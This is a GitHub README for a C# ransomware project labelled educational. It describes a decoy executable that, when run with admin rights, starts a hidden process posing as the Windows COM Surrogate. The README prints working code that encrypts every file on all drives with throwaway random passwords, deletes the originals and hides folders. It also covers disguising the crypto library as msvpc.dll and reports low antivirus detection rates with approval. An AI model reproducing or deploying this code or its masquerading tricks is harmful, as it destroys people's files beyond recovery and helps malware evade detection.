# Ransomware

Ransomware is a project written in C# 4.8 and shows how ransomeware generally works. This repository should be used for educational reasons only!!

[![Build status](https://ci.appveyor.com/api/projects/status/m435h8vg3m6uwdv2?svg=true)](https://ci.appveyor.com/project/SeppPenner/ransomware)
[![GitHub issues](https://img.shields.io/github/issues/SeppPenner/Ransomware.svg)](https://github.com/SeppPenner/Ransomware/issues)
[![GitHub forks](https://img.shields.io/github/forks/SeppPenner/Ransomware.svg)](https://github.com/SeppPenner/Ransomware/network)
[![GitHub stars](https://img.shields.io/github/stars/SeppPenner/Ransomware.svg)](https://github.com/SeppPenner/Ransomware/stargazers)
[![GitHub license](https://img.shields.io/badge/license-AGPL-blue.svg)](https://raw.githubusercontent.com/SeppPenner/Ransomware/master/License.txt)
[![Known Vulnerabilities](https://snyk.io/test/github/SeppPenner/Ransomware/badge.svg)](https://snyk.io/test/github/SeppPenner/Ransomware)

## Folders
The [Setup](https://github.com/SeppPenner/Ransomware/blob/master/Setup) folder contains a [Inno Setup](http://www.jrsoftware.org/isinfo.php) script and the installer.

The [BeforeSetup](https://github.com/SeppPenner/Ransomware/blob/master/BeforeSetup) folder contains the files the setup installs.

The [Projects](https://github.com/SeppPenner/Ransomware/blob/master/Projects) folder contains the C# source code.

## The stuff behind
The **LustigeFehler.exe** file is the main exe. It will start and show some nonsense error messages.

If it's not run in admin mode, it will crash with an error. If the .exe is started in admin mode, it will start up a new hidden (can't be seen in the taskbar or as GUI) process called
[COM Surrogate](https://github.com/SeppPenner/Ransomware/blob/master/Projects/COM%20Surrogate) in the background.

Why **COM Surrogate**? - Because noone will ever expect a [standard Windows process](https://www.howtogeek.com/326462/what-is-com-surrogate-dllhost.exe-and-why-is-it-running-on-my-pc/) is running as a virus.
In the background, the our **Fake COM Surrogate.exe** will run and try to encrypt all files on all drives it finds.

Additionally, it will **hide** all folders it finds. Furthermore, the AES crypto library is obfuscated to the name **msvpc.dll** to avoid that suspicious users (who take a look into the install folder) get more suspicious.

How is this possible? - The following lines of code taken from [Main.cs](https://github.com/SeppPenner/Ransomware/blob/master/Projects/COM%20Surrogate/COM%20Surrogate/Main.cs) show the main **ransomware** code.
```csharp
private string GetRandomPassword()
{
   var alg = SHA512.Create();
   alg.ComputeHash(Encoding.UTF8.GetBytes(DateTime.Now.ToLongDateString() + _random.Next(int.MaxValue)));
   return BitConverter.ToString(alg.Hash);
}

private void Run()
{
   foreach (var drive in DriveInfo.GetDrives())
   {
      try
      {
         EncryptFs(drive.Name);
      }
      catch
      {
         // ignored
      }
   }
}

private void EncryptFs(string directory)
{
   foreach (var file in Directory.GetFiles(directory))
   {
      try
      {
         if (file == null) continue;
         Msvpc.UseE(GetRandomPassword(), file,
            Path.Combine(directory, Path.GetFileNameWithoutExtension(file)) + Resources.Ending);
         File.Delete(file);
      }
      catch
      {
         // ignored
      }
   }

   foreach (var dir in Directory.GetDirectories(directory))
   {
      HideDirectory(dir);
      EncryptFs(dir);
   }
}

private void HideDirectory(string dir)
{
   var di = new DirectoryInfo(dir);
   if ((di.Attributes & FileAttributes.Hidden) != FileAttributes.Hidden)
   {
      di.Attributes |= FileAttributes.Hidden;
   }
}

private bool IsElevated()
{
   var id = WindowsIdentity.GetCurrent();
   return id.Owner != id.User;
}
```

## Virustotal.com scans
Well, let's see what [virustotal.com](https://www.virustotal.com) shows us as information on this "virus":

* The dllhost.exe: https://www.virustotal.com/#/file/ff946d2667b9a51b477d3abcdb12177b732c27901e199731cfe21f9430fba568/detection -->  9 / 57 detections --> Very poor :D
* The LustigeFehler.exe: https://www.virustotal.com/#/file/18436c0625daad52a141eeb9f4d4cbfd94e54264fa949ec9597c84c4ad0b39bb/detection --> 0 / 57 detections, which is ok. It's clean.
* The LustigeFehler-Setup.exe: https://www.virustotal.com/#/file/31f5447fa6c498ab526f1686cb77778f41223d6783ccba4298f9580ce8dfa055/detection --> 11 / 58 detections --> Very poor :D

## Hint
Please don't try this software on your PC. It's for educational purposes only!!!!!!

Change history
--------------

* **Version 1.0.1.0 (2019-10-27)** : Updated nuget packages, added GitVersionTask.
* **Version 1.0.0.1 (2019-05-07)** : Updated .Net version to 4.8.
* **Version 1.0.0.0 (2018-01-08)** : 1.0 release.
